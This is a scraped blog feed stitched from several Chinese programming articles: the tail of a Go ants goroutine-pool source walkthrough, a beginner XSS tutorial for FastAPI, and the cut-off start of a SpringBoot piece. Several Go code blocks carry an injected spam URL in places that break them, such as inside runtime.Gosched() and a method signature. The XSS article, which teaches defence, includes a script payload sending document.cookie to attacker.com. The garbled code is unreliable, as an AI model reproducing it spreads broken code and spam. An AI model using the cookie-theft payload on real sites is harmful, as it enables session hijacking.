生产者是客户端调用 <code>pool</code> 方法将任务写入 <code>pool</code> 对象，<code>pool</code> 对象从容器中获取可用的 <code>worker</code>，并往该 <code>worker</code> 的通道写入任务。</p>
<p>至此，主要的逻辑都走通了。</p>
<p>还有一点是容器该用栈还是用队列呢？<br/>
<code>worker</code> 写入容器后，如果长时间不用的话需要清理，清理需要按照时间排序。队列是符合这种需求的数据结构（按时间顺序，先进先出）。</p>
<h4 data-id="heading-6">流程图</h4>
<p><code>ants</code> 的流程图如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5ed176a6f7044758ced8c8e728b7a97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764564869&amp;x-signature=WwLEt%2F%2Bvl93wjZfXD%2Fzd87xvD9E%3D" alt="ants_pool" loading="lazy"/></p>
<p><em>图片来源于 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpanjf2000%2Fants%2Fblob%2Fdev%2FREADME_ZH.md" target="_blank" title="https://github.com/panjf2000/ants/blob/dev/README_ZH.md" ref="nofollow noopener noreferrer">Github ants</a></em></p>
<p>结合图片看源码应该会很清晰，这里不在赘述了。</p>
<h3 data-id="heading-7">ants 源码实现</h3>
<p>光了解流程还不够，<code>ants</code> 能在众多协程池中脱颖而出，肯定有它的过人之处。下面从细节出发看源码中有哪些过人之处，毕竟细节是魔鬼。</p>
<h4 data-id="heading-8">sync.Pool 对象复用</h4>
<p>作为协程池，需要频繁创建 <code>worker</code> 对象。<code>ants</code> 使用 <code>sync.Pool</code> 作为对象缓存，复用 <code>worker</code> 对象，降低频繁创建销毁对象导致的内存开销。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> poolCommon <span class="hljs-keyword">struct</span> {
	workerCache sync.Pool
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPool</span><span class="hljs-params">(size <span class="hljs-type">int</span>, options ...Option)</span></span> (*Pool, <span class="hljs-type">error</span>) {  
    ...
    
    <span class="hljs-comment">// sync.Pool 创建对象</span>
    pool.workerCache.New = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> any {  
       <span class="hljs-keyword">return</span> &amp;goWorker{  
          pool: pool,  
          task: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>, workerChanCap),  
       }  
    }  
  
    <span class="hljs-keyword">return</span> pool, <span class="hljs-literal">nil</span>  
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *poolCommon)</span></span> retrieveWorker() (w worker, err <span class="hljs-type">error</span>) {
	...
	<span class="hljs-keyword">if</span> capacity := p.Cap(); capacity == <span class="hljs-number">-1</span> || capacity &gt; p.Running() {  
    p.lock.Unlock()  
    <span class="hljs-comment">// 从 sync.Pool 中取 worker 对象</span>
    w = p.workerCache.Get().(worker)  
    w.run()  
    <span class="hljs-keyword">return</span>  
}
</code></pre>
<h4 data-id="heading-9">sync.spinLock</h4>
<p><code>ants</code> 实现了指数退避锁，如下：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> spinLock <span class="hljs-type">uint32</span>  
  
<span class="hljs-keyword">const</span> maxBackoff = <span class="hljs-number">16</span>  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(sl *spinLock)</span></span> Lock() {  
    backoff := <span class="hljs-number">1</span>  
    <span class="hljs-keyword">for</span> !atomic.CompareAndSwapUint32((*<span class="hljs-type">uint32</span>)(sl), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
       <span class="hljs-comment">// Leverage the exponential backoff algorithm, see https://en.wikipedia.org/wiki/Exponential_backoff.  </span>
       <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; backoff; i++ {  
          runtime.Gosched(https:<span class="hljs-comment">//www.jiwenlaw.com/)  </span>
       }  
       <span class="hljs-keyword">if</span> backoff &lt; maxBackoff {  
          backoff &lt;&lt;= <span class="hljs-number">1</span>  
       }  
    }  
}
</code></pre>
<p>作为高并发协程池，多个协程抢锁是常态。如果协程长期占有锁，其它协程一直在抢锁会造成资源浪费。<code>ants</code> 使用指数退避算法抢锁减少长时间占有锁的资源抢占。</p>
<p>并且，当抢不到锁时 <code>ants</code> 使用 <code>runtime.Gosched</code> 出让 <code>CPU</code>，而不是空转等待锁（空转协程会一直占用 CPU）。主动出让，而不是被动等待运行时请出 CPU 更加合理且快速，也让其它协程更快的执行抢占逻辑，雨露均沾。</p>
<p>执行基准测试看几种类型锁的执行性能：</p>
<pre><code class="hljs language-scss" lang="scss">func <span class="hljs-built_in">BenchmarkMutex</span>(b *testing.B) {  
    m := sync.Mutex{}  
    <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.RunParallel</span>(func(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}  
  
type spinLock uint32  
  
func (s *spinLock) <span class="hljs-built_in">Lock</span>() {  
    for !atomic<span class="hljs-selector-class">.CompareAndSwapUint32</span>((*uint32)(s), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
    }  
}  
  
func (s *spinLock) <span class="hljs-built_in">Unlock</span>() {  
    atomic<span class="hljs-selector-class">.StoreUint32</span>((*uint32)(s), <span class="hljs-number">0</span>)  
}  
  
func <span class="hljs-built_in">newSpinLock</span>() *spinLock {  
    return (*spinLock)(new(uint32))  
}  
  
func <span class="hljs-built_in">BenchmarkSpinLock</span>(b *testing.B) {  
    m := <span class="hljs-built_in">newSpinLock</span>()  
    b.<span class="hljs-built_in">RunParallel</span>(<span class="hljs-built_in">func</span>(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}  
  
type backoffSpinLock uint32  
  
<span class="hljs-selector-tag">var</span> backoff = <span class="hljs-number">16</span>  
  
func (s *backoffSpinLock) <span class="hljs-built_in">Lock</span>() {  
    <span class="hljs-selector-tag">i</span> := <span class="hljs-number">1</span>  
    for !atomic.<span class="hljs-built_in">CompareAndSwapUint32</span>((*uint32)(s), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
       if <span class="hljs-selector-tag">i</span> == backoff {  
          continue  
       }  
       <span class="hljs-selector-tag">i</span> &lt;&lt;= <span class="hljs-number">1</span>  
    }  
}  
  
func (s *backoffSpinLock) <span class="hljs-built_in">Unlock</span>() {  
    atomic<span class="hljs-selector-class">.StoreUint32</span>((*uint32)(s), <span class="hljs-number">0</span>)  
}  
  
func <span class="hljs-built_in">newBackoffSpinLock</span>() *backoffSpinLock {  
    return (*backoffSpinLock)(new(uint32))  
}  
  
func <span class="hljs-built_in">BenchmarkBackoffSpinLock</span>(b *testing.B) {  
    m := <span class="hljs-built_in">newBackoffSpinLock</span>()  
    b.<span class="hljs-built_in">RunParallel</span>(<span class="hljs-built_in">func</span>(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}  
  
type spinSchedLock uint32  
  
func (s *spinSchedLock) <span class="hljs-built_in">Lock</span>() {  
    for !atomic<span class="hljs-selector-class">.CompareAndSwapUint32</span>((*uint32)(s), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
       runtime<span class="hljs-selector-class">.Gosched</span>()  
    }  
}  
  
func (s *spinSchedLock) <span class="hljs-built_in">Unlock</span>() {  
    atomic<span class="hljs-selector-class">.StoreUint32</span>((*uint32)(s), <span class="hljs-number">0</span>)  
}  
  
func <span class="hljs-built_in">newSpinSchedLock</span>() *spinSchedLock {  
    return (*spinSchedLock)(new(uint32))  
}  
  
func <span class="hljs-built_in">BenchmarkSpinSchedLock</span>(b *testing.B) {  
    m := <span class="hljs-built_in">newSpinSchedLock</span>()  
    b.<span class="hljs-built_in">RunParallel</span>(<span class="hljs-built_in">func</span>(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}  
  
type backoffSpinSchedLock uint32  
  
<span class="hljs-selector-tag">var</span> maxBackoff = <span class="hljs-number">16</span>  
  
func (s *backoffSpinSchedLock)https://www.jiwenlaw.com/ <span class="hljs-built_in">Lock</span>() {  
    backoff := <span class="hljs-number">1</span>  
    for !atomic.<span class="hljs-built_in">CompareAndSwapUint32</span>((*uint32)(s), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
       for <span class="hljs-selector-tag">i</span> := <span class="hljs-number">0</span>; <span class="hljs-selector-tag">i</span> &lt; backoff; <span class="hljs-selector-tag">i</span>++ {  
          runtime<span class="hljs-selector-class">.Gosched</span>()  
       }  
       if backoff &lt; maxBackoff {  
          backoff &lt;&lt;= <span class="hljs-number">1</span>  
       }  
    }  
}  
  
func (s *backoffSpinSchedLock) <span class="hljs-built_in">Unlock</span>() {  
    atomic<span class="hljs-selector-class">.StoreUint32</span>((*uint32)(s), <span class="hljs-number">0</span>)  
}  
  
func <span class="hljs-built_in">newBackoffSpinSchedLock</span>() *backoffSpinSchedLock {  
    return (*backoffSpinSchedLock)(new(uint32))  
}  
  
func <span class="hljs-built_in">BenchmarkBackoffSpinSchedLock</span>(b *testing.B) {  
    m := <span class="hljs-built_in">newBackoffSpinSchedLock</span>()  
    b.<span class="hljs-built_in">RunParallel</span>(<span class="hljs-built_in">func</span>(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}
</code></pre>
<p>测试结果：</p>
<pre><code class="hljs language-bash" lang="bash"> go <span class="hljs-built_in">test</span> -v -bench=. -benchmem -run=^$
goos: darwin
goarch: arm64
pkg: github.com/xiahuyun/go-library/ants
cpu: Apple M3
BenchmarkMutex
BenchmarkMutex-8                        17903019                69.40 ns/op            0 B/op          0 allocs/op
BenchmarkSpinLock
BenchmarkSpinLock-8                     15894223               130.3 ns/op             0 B/op          0 allocs/op
BenchmarkBackoffSpinLock
BenchmarkBackoffSpinLock-8              10448190               124.0 ns/op             0 B/op          0 allocs/op
BenchmarkSpinSchedLock
BenchmarkSpinSchedLock-8                339347601                3.026 ns/op           0 B/op          0 allocs/op
BenchmarkBackoffSpinSchedLock
BenchmarkBackoffSpinSchedLock-8         400970906                2.641 ns/op           0 B/op          0 allocs/op
</code></pre>
<p>可以看到在众多锁中 <code>ants</code> 的指数退避锁表现最好。</p>
<h4 data-id="heading-10">purge worker</h4>
<p><code>ants</code> 使用一个清理协程定时清理 <code>workerQueue</code> 中的协程（ants 通过二分查找确定哪些协程是过期需要清理的，非常高效）：</p>
<h4 data-id="heading-11">ticktock</h4>
<p><code>ants</code> 中 <code>worker</code> 在放入队列时需要记录自己放入队列的时间，<code>purgeWorker</code> 会根据该时间确定哪些 <code>worker</code> 需要清理。</p>
<p>如果每个 <code>worker</code> 调用 <code>time.Now()</code> 记录时间，会造成系统资源浪费，<code>time.Now</code> 会执行系统调用，涉及内核态/用户态的切换。</p>
<p><code>ants</code> 使用 <code>ticktock</code> 协程周期性的调用 <code>time.Now</code> 生成时间戳并存到 <code>pool</code> 对象池中。<code>worker</code> 在记录时间放入队列时，只需要从对象池拿时间戳就行，显著避免系统资源消耗：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *poolCommon)</span></span> ticktock() {  https:<span class="hljs-comment">//www.jiwenlaw.com/</span>
    ticker := time.NewTicker(nowTimeUpdateInterval)  
    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {  
       ticker.Stop()  
       atomic.StoreInt32(&amp;p.ticktockDone, <span class="hljs-number">1</span>)  
    }()  
  
    ticktockCtx := p.ticktockCtx <span class="hljs-comment">// copy to the local variable to avoid race from Reboot()  </span>
    <span class="hljs-keyword">for</span> {  
       <span class="hljs-keyword">select</span> {  
       <span class="hljs-keyword">case</span> &lt;-ticktockCtx.Done():  
          <span class="hljs-keyword">return</span>  
       <span class="hljs-keyword">case</span> &lt;-ticker.C:  
       }  
  
       <span class="hljs-keyword">if</span> p.IsClosed() {  
          <span class="hljs-keyword">break</span>  
       }  
  
	   <span class="hljs-comment">// 记录当前时间到 pool 对象池</span>
       p.now.Store(time.Now())  
    }  
}
</code></pre>
<h2 data-id="heading-12">总结</h2>
<p><code>ants</code> 是一个被广泛使用的高性能协程池，特别适合学习，了解协程池的实现。本文从整体到细节介绍 <code>ants</code> 的实现，希望对大家有所帮助，感谢。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[安全小白入门(2)-----跨站脚本（XSS）]]></title>    <link>https://juejin.cn/post/7575937594350977067</link>    <guid>https://juejin.cn/post/7575937594350977067</guid>    <pubDate>2025-11-24T05:24:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594350977067" data-draft-id="7575937594350927915" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="安全小白入门(2)-----跨站脚本（XSS）"/> <meta itemprop="keywords" content="安全,前端,后端"/> <meta itemprop="datePublished" content="2025-11-24T05:24:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="天下不喵"/> <meta itemprop="url" content="https://juejin.cn/user/9257993379453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            安全小白入门(2)-----跨站脚本（XSS）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/9257993379453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    天下不喵
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T05:24:33.000Z" title="Mon Nov 24 2025 05:24:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">跨站脚本（XSS）</h2>
<h3 data-id="heading-1">1. 漏洞原理</h3>
<p>XSS 是由于 <strong>用户输入的恶意脚本未被转义，直接在浏览器中执行</strong>，导致攻击者窃取 Cookie、伪造身份或钓鱼。FastAPI 虽以 JSON 接口为主，但若返回 HTML 内容（如模板渲染）或前端直接渲染 API 返回的用户输入，仍可能触发 XSS。</p>
<h3 data-id="heading-2">2. 攻击场景（FastAPI 漏洞代码）</h3>
<p>假设 FastAPI 接口返回包含用户输入的 HTML 页面（使用 Jinja2 模板）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Request
<span class="hljs-keyword">from</span> fastapi.templating <span class="hljs-keyword">import</span> Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory=<span class="hljs-string">"templates"</span>)

<span class="hljs-comment"># 漏洞接口：未转义用户输入，直接渲染到HTML</span>
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/welcome"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">welcome</span>(<span class="hljs-params">request: Request, username: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-comment"># 危险！username直接拼接进HTML，若包含脚本会执行</span>
    <span class="hljs-keyword">return</span> templates.TemplateResponse(<span class="hljs-string">"welcome.html"</span>, {
        <span class="hljs-string">"request"</span>: request,
        <span class="hljs-string">"username"</span>: username  <span class="hljs-comment"># 攻击者可构造username=&lt;script&gt;恶意代码&lt;/script&gt;</span>
    })
</code></pre>
<p>对应的<code>templates/welcome.html</code>模板：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 未转义渲染用户输入 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome, {{ username }}!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">攻击步骤：</h4>
<ol>
<li>攻击者访问接口，构造恶意<code>username</code>：<code>/welcome?username=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
<li>浏览器渲染页面时，<code> &lt;script&gt;</code>标签被执行，弹出 “XSS” 提示（简单演示）。</li>
<li>进阶攻击：窃取 Cookie 并发送到攻击者服务器：<code>/welcome?username=&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</code>若用户已登录，Cookie 包含会话信息，攻击者可劫持会话。</li>
</ol>
<h3 data-id="heading-4">3. 防护方案（修复代码 + 最佳实践）</h3>
<p>核心原则：<strong>对用户输入进行 HTML 转义，或避免在 HTML 中直接渲染用户输入</strong>。</p>
<h4 data-id="heading-5">修复方案 1：模板自动转义（Jinja2 默认开启）</h4>
<p>Jinja2 模板默认会对<code>{{ variable }}</code>进行 HTML 转义（将<code>&lt;</code>转义为<code>&amp;lt;</code>，<code>&gt;</code>转义为<code>&amp;gt;</code>等），恶意脚本会被当作普通文本显示。上述代码无需修改，Jinja2 已自动防护 —— 若用户输入<code>&lt;script&gt;</code>，会被转义为<code>&amp;lt;script&amp;gt;</code>，不会执行。</p>
<h4 data-id="heading-6">修复方案 2：手动转义（若需自定义渲染）</h4>
<p>若使用其他模板引擎或手动拼接 HTML，需手动转义用户输入（使用<code>html</code>模块）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> html

<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/welcome"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">welcome</span>(<span class="hljs-params">request: Request, username: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-comment"># 手动转义用户输入，确保安全</span>
    safe_username = html.escape(username)
    <span class="hljs-keyword">return</span> templates.TemplateResponse(<span class="hljs-string">"welcome.html"</span>, {
        <span class="hljs-string">"request"</span>: request,
        <span class="hljs-string">"username"</span>: safe_username
    })
</code></pre>
<h4 data-id="heading-7">额外防护：</h4>
<ul>
<li>避免返回 HTML：FastAPI 优先使用 JSON 接口，前端通过 JavaScript 渲染数据（JSON 不会执行脚本）。</li>
<li>设置安全响应头：通过<code>fastapi.middleware.cors.CORSMiddleware</code>限制跨域，或添加<code>Content-Security-Policy</code>（CSP）头，禁止加载外部脚本。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot 3.2 性能优化全攻略：7个让你的应用提速50%的关键技巧]]></title>    <link>https://juejin.cn/post/7576077034742824994</link>    <guid>https://juejin.cn/post/7576077034742824994</guid>    <pubDate>2025-11-24T04:16:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576077034742824994" data-draft-id="7575413146923221007" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot 3.2 性能优化全攻略：7个让你的应用提速50%的关键技巧"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2025-11-24T04:16:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT_陈寒"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot 3.2 性能优化全攻略：7个让你的应用提速50%的关键技巧
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT_陈寒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:16:54.000Z" title="Mon Nov 24 2025 04:16:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
